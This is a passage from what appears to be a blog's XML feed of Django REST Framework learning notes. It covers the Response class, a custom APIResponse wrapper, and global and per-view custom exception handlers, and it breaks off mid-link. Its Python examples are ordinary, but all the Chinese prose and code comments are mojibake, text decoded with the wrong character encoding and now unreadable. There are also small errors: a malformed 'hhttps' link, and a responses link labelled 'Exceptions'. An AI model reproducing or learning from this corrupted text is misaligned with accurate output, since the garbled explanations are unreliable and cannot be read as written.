<code>instance</code>‰º†ÂèÇÔºâ<ul><li>Â∫èÂàóÂåñÔºöÊòØÊï∞ÊçÆÂØπË±°‰ªéÊï∞ÊçÆÂ∫ì‰∏≠Êü•Âá∫ÔºåÈÄöËøáinstance‰º†ÂÖ•Â∫èÂàóÂåñÂô®‰∏≠ÔºåÂøÖÈ°ªÈÄöËøádataÂ±ûÊÄßÊâçËÉΩÂ∞ÜÂ∫èÂàóÂåñÂêéÁöÑÊï∞ÊçÆ‰º†ÁªôÂâçÁ´ØÔºå‰∏çËÉΩÁõ¥Êé•‰º†Â∫èÂàóÂåñÂØπË±°</li><li>ÂèçÂ∫èÂàóÂåñÔºöÊòØÊï∞ÊçÆÊòØÈÄöËøárequest.data‰ªéÂâçÁ´ØËé∑ÂèñÂà∞Êï∞ÊçÆÔºåÈÄöËøádata‰º†ÂÖ•Â∫èÂàóÂåñÂô®‰∏≠ËøõË°åÊ†°È™åÔºå‰øùÂ≠òÂà∞Êï∞ÊçÆÂ∫ì‰∏≠</li></ul></li><li>Â∫èÂàóÂåñÂô®ÁöÑÂ≠óÊÆµÂ£∞ÊòéÁ±ª‰ºº‰∫éÊàë‰ª¨ÂâçÈù¢‰ΩøÁî®ËøáÁöÑË°®ÂçïÁ≥ªÁªü</li><li>ÂºÄÂèërestful apiÊó∂ÔºåÂ∫èÂàóÂåñÂô®‰ºöÂ∏ÆÊàë‰ª¨ÊääÊ®°ÂûãÊï∞ÊçÆËΩ¨Êç¢ÊàêÂ≠óÂÖ∏</li><li>drfÊèê‰æõÁöÑËßÜÂõæ‰ºöÂ∏ÆÊàë‰ª¨ÊääÂ≠óÂÖ∏ËΩ¨Êç¢ÊàêjsonÔºåÊàñËÄÖÊääÂÆ¢Êà∑Á´ØÂèëËøáÊù•ÁöÑÊï∞ÊçÆËΩ¨Êç¢ÊàêÂ≠óÂÖ∏</li></ol>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework Â≠¶‰π†Á¨îËÆ∞ÔºàÂÖ≠ÔºâÔºöÂìçÂ∫îÊ®°Âùó response</title>
      <link href="/tech/drf-learning-notes-6-the-response-module/"/>
      <url>/tech/drf-learning-notes-6-the-response-module/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (6): the response module</strong></em></li><li>Author: dog2</li></ul><hr /><h1 id="Âü∫Êú¨‰ø°ÊÅØ">Âü∫Êú¨‰ø°ÊÅØ</h1><ul><li>Ê∫êÁ†ÅÔºö<a href="hhttps://github.com/encode/django-rest-framework/blob/master/rest_framework/response.py"><code>rest_framework.response</code></a></li><li>ÂÆòÊñπÊñáÊ°£Ôºö<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVzcG9uc2VzLw==">API Guide - Exceptions<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h1 id="Ê∫êÁ†ÅÂàÜÊûê">Ê∫êÁ†ÅÂàÜÊûê</h1><p>ÂìçÂ∫îÁ±ªÊûÑÈÄ†Âô®Ôºö<code>rest_framework.response.Response</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span><span class="params">(SimpleTemplateResponse)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data=None, status=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 template_name=None, headers=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 exception=False, content_type=None)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">            :param data: ÂìçÂ∫îÊï∞ÊçÆ</span></span><br><span class="line"><span class="string">            :param status: httpÂìçÂ∫îÁä∂ÊÄÅÁ†Å</span></span><br><span class="line"><span class="string">            :param template_name: drf‰πüÂèØ‰ª•Ê∏≤ÊüìÈ°µÈù¢ÔºåÊ∏≤ÊüìÁöÑÈ°µÈù¢Ê®°ÊùøÂú∞ÂùÄÔºà‰∏çÁî®‰∫ÜËß£Ôºâ</span></span><br><span class="line"><span class="string">            :param headers: ÂìçÂ∫îÂ§¥</span></span><br><span class="line"><span class="string">            :param exception: ÊòØÂê¶ÂºÇÂ∏∏‰∫Ü</span></span><br><span class="line"><span class="string">            :param content_type: ÂìçÂ∫îÁöÑÊï∞ÊçÆÊ†ºÂºèÔºà‰∏ÄËà¨‰∏çÁî®Â§ÑÁêÜÔºåÂìçÂ∫îÂ§¥‰∏≠Â∏¶‰∫ÜÔºå‰∏îÈªòËÆ§ÊòØjsonÔºâ</span></span><br><span class="line"><span class="string">        """</span></span><br></pre></td></tr></table></figure><h1 id="Áî®Ê≥ïÁ§∫‰æã">Áî®Ê≥ïÁ§∫‰æã</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># statusÊòØËß£Èáä‰∏ÄÂ†Ü Êï∞Â≠ó ÁΩëÁªúÁä∂ÊÄÅÁ†ÅÁöÑÊ®°Âùó</span></span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"></span><br><span class="line"><span class="comment"># ‰∏ÄËà¨ÊÉÖÂÜµ‰∏ãÂè™ÈúÄË¶ÅËøîÂõûÊï∞ÊçÆÔºåstatusÂíåheadersÈÉΩÊúâÈªòËÆ§ÂÄº</span></span><br><span class="line"><span class="keyword">return</span> Response(data=&#123;Êï∞ÊçÆ&#125;, status=status.HTTP_200_OK, headers=&#123;ËÆæÁΩÆÁöÑÂìçÂ∫îÂ§¥&#125;)</span><br></pre></td></tr></table></figure><h1 id="‰∫åÊ¨°Â∞ÅË£ÖresponseÁ±ª">‰∫åÊ¨°Â∞ÅË£ÖResponseÁ±ª</h1><p>ÂèØ‰ª•Ëá™ÂÆö‰πâAPIResponse‰ª•‰æø‰∫é‰ΩøÁî®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APIResponse</span><span class="params">(Response)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data_status=<span class="number">0</span>, data_msg=<span class="string">'ok'</span>, results=None, http_status=None, headers=None, exception=False, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># dataÁöÑÂàùÂßãÁä∂ÊÄÅÔºöÁä∂ÊÄÅÁ†Å‰∏éÁä∂ÊÄÅ‰ø°ÊÅØ</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'status'</span>: data_status,</span><br><span class="line">            <span class="string">'msg'</span>: data_msg,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># dataÁöÑÂìçÂ∫îÊï∞ÊçÆ‰Ωì</span></span><br><span class="line">        <span class="comment"># resultsÂèØËÉΩÊòØFalse„ÄÅ0Á≠âÊï∞ÊçÆÔºåËøô‰∫õÊï∞ÊçÆÊüê‰∫õÊÉÖÂÜµ‰∏ã‰πü‰ºö‰Ωú‰∏∫ÂêàÊ≥ïÊï∞ÊçÆËøîÂõû</span></span><br><span class="line">        <span class="keyword">if</span> results <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            data[<span class="string">'results'</span>] = results</span><br><span class="line">        <span class="comment"># dataÂìçÂ∫îÁöÑÂÖ∂‰ªñÂÜÖÂÆπ</span></span><br><span class="line">        <span class="comment"># if kwargs is not None:</span></span><br><span class="line">        <span class="comment">#     for k, v in kwargs.items():</span></span><br><span class="line">        <span class="comment">#         setattr(data, k, v)</span></span><br><span class="line">        data.update(kwargs)</span><br><span class="line"></span><br><span class="line">        super().__init__(data=data, status=http_status, headers=headers, exception=exception)   <span class="comment">#ÈáçÂÜôÁà∂Á±ªResponseÁöÑ__init__ÊñπÊ≥ï</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework Â≠¶‰π†Á¨îËÆ∞Ôºà‰∫îÔºâÔºöÂºÇÂ∏∏Ê®°Âùó exceptions</title>
      <link href="/tech/drf-learning-notes-5-the-exceptions-module/"/>
      <url>/tech/drf-learning-notes-5-the-exceptions-module/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (5): the exceptions module</strong></em></li><li>Author: dog2</li></ul><hr /><h1 id="Âü∫Êú¨‰ø°ÊÅØ">Âü∫Êú¨‰ø°ÊÅØ</h1><ul><li>Ê∫êÁ†ÅÔºö<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/exceptions.py" target="_blank" rel="noopener"><code>rest_framework.exceptions</code></a></li><li>ÂÆòÊñπÊñáÊ°£Ôºö<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZXhjZXB0aW9ucy8=">API Guide - Exceptions<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzVfZHJmX2V4Y2VwdGlvbg==">Êú¨Êñádemo‰ª£Á†ÅGithub<i class="fa fa-external-link-alt"></i></span></li></ul><h1 id="ÂºÇÂ∏∏Â§ÑÁêÜ">ÂºÇÂ∏∏Â§ÑÁêÜ</h1><h2 id="drfÂºÇÂ∏∏Â§ÑÁêÜ">DRFÂºÇÂ∏∏Â§ÑÁêÜ</h2><ol type="1"><li>ÊâÄÊúâÁªèËøádrfÁöÑ<code>APIView</code>ËßÜÂõæÁ±ª‰∫ßÁîüÁöÑÂºÇÂ∏∏ÔºåÈÉΩÂèØ‰ª•Êèê‰æõÂºÇÂ∏∏Â§ÑÁêÜÊñπÊ°à</li><li>drfÈªòËÆ§Êèê‰æõ‰∫ÜÂºÇÂ∏∏Â§ÑÁêÜÊñπÊ°à<code>rest_framework.views.exception_handler</code>Ôºå‰ΩÜÊòØÂ§ÑÁêÜËåÉÂõ¥ÊúâÈôê</li><li>drfÊèê‰æõÁöÑÂ§ÑÁêÜÊñπÊ°à‰∏§ÁßçÔºåÂ§ÑÁêÜ‰∫ÜËøîÂõûÂºÇÂ∏∏Áé∞Ë±°ÔºåÊ≤°Â§ÑÁêÜËøîÂõûNone(ÂêéÁª≠Â∞±ÊòØÊúçÂä°Âô®ÊäõÂºÇÂ∏∏ÁªôÂâçÂè∞)</li></ol><p>ÈÄöÂ∏∏Âá∫‰∫é‰∏Ä‰∫õÂéüÂõ†Êàë‰ª¨ÈúÄË¶ÅËá™ÂÆö‰πâÂºÇÂ∏∏Â§ÑÁêÜÔºåËÄåÈùû‰ΩøÁî®DRFÁöÑÈªòËÆ§ÂºÇÂ∏∏„ÄÇ</p><h2 id="Âü∫‰∫édrfËá™ÂÆö‰πâÂºÇÂ∏∏Â§ÑÁêÜ">Âü∫‰∫éDRFËá™ÂÆö‰πâÂºÇÂ∏∏Â§ÑÁêÜ</h2><p>Ëá™ÂÆö‰πâÂºÇÂ∏∏Â§ÑÁêÜÁöÑÂ∏∏ËßÅÂ∫îÁî®Âú∫ÊôØÂ¶Ç‰∏ãÔºö</p><ol type="1"><li>Ëß£ÂÜ≥drfÊ≤°ÊúâÂ§ÑÁêÜÁöÑÂºÇÂ∏∏</li><li>ËÆ©ÂâçÂè∞ÂæóÂà∞ÂêàÁêÜÁöÑÂºÇÂ∏∏‰ø°ÊÅØËøîÂõû„ÄÅÈöêËóèÂºÇÂ∏∏ÁªÜËäÇËÄåËøîÂõûÈÄöÁî®ÂºÇÂ∏∏‰ø°ÊÅØ</li><li>ÂêéÂè∞ËÆ∞ÂΩïÂºÇÂ∏∏ÂÖ∑‰Ωì‰ø°ÊÅØ„ÄÅÂ¶ÇÂ∞ÜÂºÇÂ∏∏ÁªÜËäÇÂÜôÂÖ•Êó•Âøó‰ª•‰æõÂÆ°ËÆ°Á≠â</li></ol><a id="more"></a><h1 id="Ê∫êÁ†ÅÂàÜÊûê">Ê∫êÁ†ÅÂàÜÊûê</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ÂºÇÂ∏∏Ê®°ÂùóÔºöAPIViewÁ±ªÁöÑdispatchÊñπÊ≥ï‰∏≠</span></span><br><span class="line">response = self.handle_exception(exc)  <span class="comment"># ÁÇπËøõÂéª</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Ëá™ÂÆö‰πâÂºÇÂ∏∏Â∞±ÊòØÊèê‰æõÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞exception_handler,Â§ÑÁêÜÁöÑÁõÆÁöÑÂ∞±ÊòØËÆ©response‰∏ÄÂÆöÊúâÂÄº</span></span><br><span class="line"><span class="comment">#Ëá™ÂÆö‰πâÔºöËá™Â∑±ÂÜôexception_handlerÂáΩÊï∞ÔºåÂú®Ëá™Â∑±ÁöÑÈÖçÁΩÆÊñá‰ª∂ÈÖçÁΩÆEXCEPTION_HANDLERÊåáÂêëËá™Â∑±ÁöÑÂ§ÑÁêÜÂºÇÂ∏∏ÂáΩÊï∞</span></span><br><span class="line">exception_handler = self.get_exception_handler() <span class="comment">#ÁÇπËøõÂéª #Ëé∑ÂèñÂ§ÑÁêÜÂºÇÂ∏∏ÁöÑÊñπÊ≥ïÔºå‰πüÂèØ‰ª•Ëá™ÂÆö‰πâÂºÇÂ∏∏Â§ÑÁêÜÊñπÊ≥ïÔºåÂú®settingsÊñá‰ª∂‰∏≠ÈÖçÁΩÆ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#settings‰∏≠Ëé∑ÂèñÂºÇÂ∏∏Â§ÑÁêÜÁöÑÊñπÂºè</span></span><br><span class="line"><span class="keyword">return</span> self.settings.EXCEPTION_HANDLER</span><br><span class="line"></span><br><span class="line"><span class="comment"># APIViewÁ±ªÂ±ûÊÄßsettings</span></span><br><span class="line">settings = api_settings</span><br><span class="line"></span><br><span class="line"><span class="comment"># api_settings‰∏≠ÂÆö‰πâÁöÑÈªòËÆ§ÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞ÔºåÂèàÊåáÂêëÂõû‰∫Üviews.exception_handlerÂáΩÊï∞</span></span><br><span class="line"><span class="string">'EXCEPTION_HANDLER'</span>: <span class="string">'rest_framework.views.exception_handler'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ÂºÇÂ∏∏Â§ÑÁêÜÁöÑÁªìÊûú</span></span><br><span class="line"><span class="comment"># Ëá™ÂÆö‰πâÂºÇÂ∏∏Â∞±ÊòØÊèê‰æõexception_handlerÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞ÔºåÂ§ÑÁêÜÁöÑÁõÆÁöÑÂ∞±ÊòØËÆ©response‰∏ÄÂÆöÊúâÂÄº</span></span><br><span class="line">response = exception_handler(exc, context)   <span class="comment">#ÊúÄÂêéÂèëÁé∞Âú®views‰∏≠ÁöÑexception_handlerÂ∞±ÊòØÂ§ÑÁêÜÂºÇÂ∏∏ÁöÑÊñπÊ≥ï</span></span><br></pre></td></tr></table></figure><p>‰ªé<code>dispatch‰∏≠ÁöÑhandle_exception</code>ËøõÂÖ•Ôºå<code>get_exception_handler()</code>Ëé∑ÂæóÂ§ÑÁêÜÂºÇÂ∏∏ÊñπÊ≥ï<code>exception_handler()</code>ÔºåÂú®ËøôÈáå‰πüÂèØ‰ª•Ëá™ÂÆö‰πâÂºÇÂ∏∏ÊñπÊ≥ï„ÄÇÊâßË°å<code>exception_handler()</code>Ëé∑ÂèñÂºÇÂ∏∏Â§ÑÁêÜÁöÑÁªìÊûú„ÄÇ</p><h1 id="Áî®Ê≥ïÁ§∫‰æã">Áî®Ê≥ïÁ§∫‰æã</h1><h2 id="Ëá™ÂÆö‰πâÂÖ®Â±ÄÈÖçÁΩÆ">Ëá™ÂÆö‰πâÂÖ®Â±ÄÈÖçÁΩÆ</h2><p>ËøôÊòØËßÜÈ¢ëÊïôÁ®ãÈáåÁöÑÂÅöÊ≥ïÔºåÂÆÉÂØπ‰∫éÊâÄÊúâËßÜÂõæÈÉΩÈááÁî®Ëá™Â∑±ÂÆöÂà∂ÁöÑÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞„ÄÇ</p><ol type="1"><li>Âú®È°πÁõÆÁöÑ<code>settings.py</code>‰∏≠</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ‰øÆÊîπËá™Â∑±ÁöÑÈÖçÁΩÆÊñá‰ª∂setting.py</span></span><br><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># ÂÖ®Â±ÄÈÖçÁΩÆÂºÇÂ∏∏Ê®°Âùó</span></span><br><span class="line">    <span class="string">'EXCEPTION_HANDLER'</span>: <span class="string">'api.exception.exception_handler'</span>,  <span class="comment">#ËÆæÁΩÆËá™ÂÆö‰πâÂºÇÂ∏∏Êñá‰ª∂Ë∑ØÂæÑÔºåÂú®apiÂ∫îÁî®‰∏ãÂàõÂª∫exceptionÊñá‰ª∂Ôºåexception_handlerÂáΩÊï∞</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2" type="1"><li>ÂàõÂª∫Ëá™ÂÆö‰πâÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞ÔºåÂáΩÊï∞ÂÜÖÈÉ®ÈÄªËæë‰∏ÄËà¨‰∏∫<ol type="1"><li>ÂÖàÂ∞ÜÂºÇÂ∏∏Â§ÑÁêÜ‰∫§Áªô<code>rest_framework.views</code>ÁöÑ<code>exception_handler</code>ÂéªÂ§ÑÁêÜ</li><li>Âà§Êñ≠Â§ÑÁêÜÁöÑÁªìÊûú(ËøîÂõûÂÄº)<code>response</code>ÔºåÊúâÂÄº‰ª£Ë°®drfÂ∑≤ÁªèÂ§ÑÁêÜ‰∫ÜÔºå<code>None</code>‰ª£Ë°®drfÂ§ÑÁêÜ‰∏ç‰∫ÜÁöÑÂºÇÂ∏∏ÔºåÈúÄË¶ÅËá™ÂÆö‰πâÂéªÂ§ÑÁêÜ</li></ol></li></ol><p>apiÂ∫îÁî®‰∏ãÂàõÂª∫Â§ÑÁêÜÂºÇÂ∏∏Êñá‰ª∂exception.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Ëá™ÂÆö‰πâÂºÇÂ∏∏Â§ÑÁêÜÊñá‰ª∂exceptionÔºåÈáçÂÜôexception_handlerÂáΩÊï∞</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> exception_handler <span class="keyword">as</span> drf_exception_handler   <span class="comment">#drfÂéüÁîüÂ§ÑÁêÜÂºÇÂ∏∏ÂáΩÊï∞ÂèñÂà´Âêç drf_exception_handler</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exception_handler</span><span class="params">(exc, context)</span>:</span>  <span class="comment">#Ëá™ÂÆö‰πâÂ§ÑÁêÜÂºÇÂ∏∏ÂáΩÊï∞</span></span><br><span class="line">    <span class="comment"># drfÁöÑexception_handlerÂÅöÂü∫Á°ÄÂ§ÑÁêÜ</span></span><br><span class="line">    response = drf_exception_handler(exc, context)</span><br><span class="line">    <span class="comment"># ‰∏∫Á©∫ÔºåÂ∞±ÊòØdrfÊ°ÜÊû∂Â§ÑÁêÜ‰∏ç‰∫ÜÁöÑÂºÇÂ∏∏</span></span><br><span class="line">    <span class="keyword">if</span> response <span class="keyword">is</span> <span class="literal">None</span>: <span class="comment">#Â§ÑÁêÜ‰πãÂêé‰∏∫Á©∫ÔºåÂÜçËøõË°åËá™ÂÆö‰πâÁöÑ‰∫åÊ¨°Â§ÑÁêÜ</span></span><br><span class="line">        <span class="comment"># print(exc)    #ÈîôËØØÂéüÂõ†   ËøòÂèØ‰ª•ÂÅöÊõ¥ËØ¶ÁªÜÁöÑÂéüÂõ†ÔºåÈÄöËøáÂà§Êñ≠exc‰ø°ÊÅØÁ±ªÂûã</span></span><br><span class="line">        <span class="comment"># print(context)  #ÈîôËØØ‰ø°ÊÅØ</span></span><br><span class="line">        print(<span class="string">'%s - %s - %s'</span> % (context[<span class="string">'view'</span>], context[<span class="string">'request'</span>].method, exc))</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'detail'</span>: <span class="string">'global customized exception: internal server error'</span> <span class="comment"># ÂÖ®Â±ÄÂÆöÂà∂ÂºÇÂ∏∏ÔºöÊúçÂä°Âô®ÈîôËØØ</span></span><br><span class="line">        &#125;, status=status.HTTP_500_INTERNAL_SERVER_ERROR, exception=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> response     <span class="comment">#Â§ÑÁêÜ‰πãÂêéÊúâÂÄºÔºåÂ∞±Áõ¥Êé•ËøîÂõûÁªìÊûú</span></span><br></pre></td></tr></table></figure><h2 id="Ëá™ÂÆö‰πâÂ±ÄÈÉ®ÈÖçÁΩÆ">Ëá™ÂÆö‰πâÂ±ÄÈÉ®ÈÖçÁΩÆ</h2><p>ËøôÊòØÊàëÊãìÂ±ïÁöÑÊñπÊ≥ïÔºåÂÆÉÂèØ‰ª•ÈíàÂØπÊüê‰∏™ÁâπÂÆöÁöÑËßÜÂõæÁ±ªÔºåÂÆöÂà∂‰∏çÂêå‰∫éÂÖ®Â±ÄÂÆöÂà∂ÂºÇÂ∏∏ÁöÑÁâπÊúâÂ§ÑÁêÜÊñπÂºè„ÄÇ</p><p>Ê†πÊçÆÂâçÈù¢ÁöÑÊ∫êÁ†ÅÂàÜÊûê‰∏≠ÂèØ‰ª•Áü•ÈÅìÔºåË¶Å‰∏∫ËßÜÂõæÁ±ªÂçïÁã¨ÂÆöÂà∂ÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞ÔºåÂèØ‰ª•ËøôÊ†∑ÂÅöÔºö</p><ol type="1"><li>Âú®ÁªßÊâø<code>APIView</code>ÁºñÂÜôËßÜÂõæÁ±ªÊó∂ÔºåÈáçÂÜôÁà∂Á±ªÁöÑ<code>get_exception_handler</code>ÂáΩÊï∞ÔºåËÆ©ÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞ÊåáÂêëËá™ÂÆö‰πâÁöÑÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞„ÄÇ</li><li>Âú®ËßÜÂõæÁ±ª‰∏≠Âä†ÂÖ•ÂÆöÂà∂ÁöÑÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞„ÄÇ</li></ol><p>Á§∫‰æã‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.views.decorators.csrf <span class="keyword">import</span> csrf_exempt</span><br><span class="line"><span class="keyword">from</span> django.utils.decorators <span class="keyword">import</span> method_decorator</span><br><span class="line"><span class="comment"># drfÂéüÁîüÂ§ÑÁêÜÂºÇÂ∏∏ÂáΩÊï∞ÂèñÂà´Âêç drf_exception_handler</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> exception_handler <span class="keyword">as</span> drf_exception_handler</span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"></span><br><span class="line"><span class="meta">@method_decorator(csrf_exempt, name='dispatch')</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LocalExceptionView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        print(request.query_params)</span><br><span class="line">        print(request.data)</span><br><span class="line">        print(request.not_exists) <span class="comment"># error code</span></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">'post ok'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_exception_handler</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.exception_handler</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exception_handler</span><span class="params">(self, exc, context)</span>:</span></span><br><span class="line">        <span class="comment"># drfÁöÑexception_handlerÂÅöÂü∫Á°ÄÂ§ÑÁêÜ</span></span><br><span class="line">        response = drf_exception_handler(exc, context)</span><br><span class="line">        <span class="comment"># ‰∏∫Á©∫ÔºåÂ∞±ÊòØdrfÊ°ÜÊû∂Â§ÑÁêÜ‰∏ç‰∫ÜÁöÑÂºÇÂ∏∏</span></span><br><span class="line">        <span class="keyword">if</span> response <span class="keyword">is</span> <span class="literal">None</span>: <span class="comment">#Â§ÑÁêÜ‰πãÂêé‰∏∫Á©∫ÔºåÂÜçËøõË°åËá™ÂÆö‰πâÁöÑ‰∫åÊ¨°Â§ÑÁêÜ</span></span><br><span class="line">            <span class="comment"># print(exc)    #ÈîôËØØÂéüÂõ†   ËøòÂèØ‰ª•ÂÅöÊõ¥ËØ¶ÁªÜÁöÑÂéüÂõ†ÔºåÈÄöËøáÂà§Êñ≠exc‰ø°ÊÅØÁ±ªÂûã</span></span><br><span class="line">            <span class="comment"># print(context)  #ÈîôËØØ‰ø°ÊÅØ</span></span><br><span class="line">            print(<span class="string">'%s - %s - %s'</span> % (context[<span class="string">'view'</span>], context[<span class="string">'request'</span>].method, exc))</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'detail'</span>: <span class="string">'local customized exception: internal server error'</span> <span class="comment"># Â±ÄÈÉ®ÂÆöÂà∂ÂºÇÂ∏∏ÔºöÊúçÂä°Âô®ÈîôËØØ</span></span><br><span class="line">            &#125;, status=status.HTTP_500_INTERNAL_SERVER_ERROR, exception=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> response     <span class="comment">#Â§ÑÁêÜ‰πãÂêéÊúâÂÄºÔºåÂ∞±Áõ¥Êé•ËøîÂõûÁªìÊûú</span></span><br></pre></td></tr></table></figure><h2 id="ÊµãËØïdemo">ÊµãËØïdemo</h2><p>ÊµãËØï‰ª£Á†ÅÂú®ËøôÈáåÔºö<a 